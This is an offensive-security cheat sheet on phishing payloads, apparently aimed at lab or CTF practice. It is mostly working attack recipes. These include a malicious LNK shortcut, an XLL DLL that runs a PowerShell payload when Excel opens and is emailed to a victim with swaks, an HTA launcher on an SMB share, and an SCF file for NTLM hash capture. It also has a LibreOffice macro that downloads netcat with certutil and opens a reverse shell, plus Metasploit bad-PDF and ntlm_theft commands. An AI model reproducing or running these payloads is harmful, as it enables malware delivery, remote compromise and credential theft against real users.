---
title: "Phishing"
date: 2024-6-26
tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt", "libre", "vba", "ntlm_theft"]
---

---
{{< tab set1 tab1 active >}}lnk{{< /tab >}}
{{< tab set1 tab2 >}}xll{{< /tab >}}
{{< tab set1 tab3 >}}hta{{< /tab >}}
{{< tab set1 tab4 >}}scf{{< /tab >}}
{{< tab set1 tab5 >}}odt{{< /tab >}}
{{< tab set1 tab6 >}}pdf{{< /tab >}}
{{< tab set1 tab7 >}}others{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```powershell
$obj = New-Object -ComObject WScript.Shell
```

```powershell
$link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk")
```

```powershell
$link.TargetPath = "C:\ProgramData\rev.exe"
```

```powershell
$link.Save()
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### shell.c

<div>

```c
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

</div>

#### 1. Compile shell.c in Linux

<div>

```bash
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
```

</div>

#### 2. Send email with the malicious xll file

<div>

```bash
swaks --to "victim@victim.com" --from "attacker@attacker.com" --server "victim.com" --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
```

</div>

<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

#### 1. Start a Local SMB Server

<div>

```bash
# In our local Linux machine
impacket-smbserver -smb2support share .
```

</div>

#### 2. Create a Malicious hta File in local Linux SMB share

<div>

```html
<html>
    <head>
        <HTA:APPLICATION ID="shell">
        <script language="javascript">
            var c = "<PowerShell #3 Base64 Payload>";  
            new ActiveXObject('WScript.Shell').Run(c, 0, true); 
        </script>
    </head>
    <body>
        <script>self.close();</script>
    </body>
</html>
```

</div>

#### 3. Create a shortcut file in target Windows

<div>

```powershell
# In target Windows machine (powershell)
$url = "file://10.10.14.10/share/shell.hta"
```

```powershell
$shortcutPath = "C:\ProgramData\shell.url"
```

```powershell
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
```

```powershell
Set-Content -Path $shortcutPath -Value $shortcutContent
```

</div>

<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

### If any interaction from target to smb share

#### 1. Start Responder

<div>

```bash
# In our local Linux machine
sudo responder -I tun0
```

</div>

#### 2. Create a malicious shortcut

<div>

```evil.scf
[Shell]
Command=2

IconFile=\\10.10.14.10\icon
```

</div>

#### 3. Upload the malicious shortcut

<div>

```bash
# In our local Linux machine
smbclient -N \\\\10.10.11.10\\share\\
```

```bash
mput evil.scf
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab5 >}}

<div>

```
+--------------------------------------------------------+
| 1. "Tools" > "Macros" > "Organize Macros" > "Basic..." |
| 2. "Untitled 1" > "Standard" > "New"                   |
| 3. "Paste the code below"                              |
+--------------------------------------------------------+
```

</div>

<br>

<div>

```bash
Sub OnLoad
    shell("cmd /c certutil -urlcache -split -f http://10.10.14.10/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd 10.10.14.10 443")
End Sub
```

</div>

<br>

<div>

```
+-----------------------------------------------------------+
| 4. "Tools" > "Organize Macros" > "Basic..." > "Assign..." |
| 5. "Events" > "Open Document" > "OK"                      |
| 6. "SAVE"                                                 |
+-----------------------------------------------------------+
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab6 >}}

<div>

```bash
msfconsole -q
```

```bash
search badpdf
```

```bash
set filename evil.pdf
```

```bash
set lhost 10.10.14.10
```

```bash
exploit
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab7 >}}

<div>

```bash
python3 ntlm_theft.py -g all -s 10.10.14.10 -f test
```

</div>

<small>*Ref: [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)*</small>

{{< /tabcontent >}}

<br>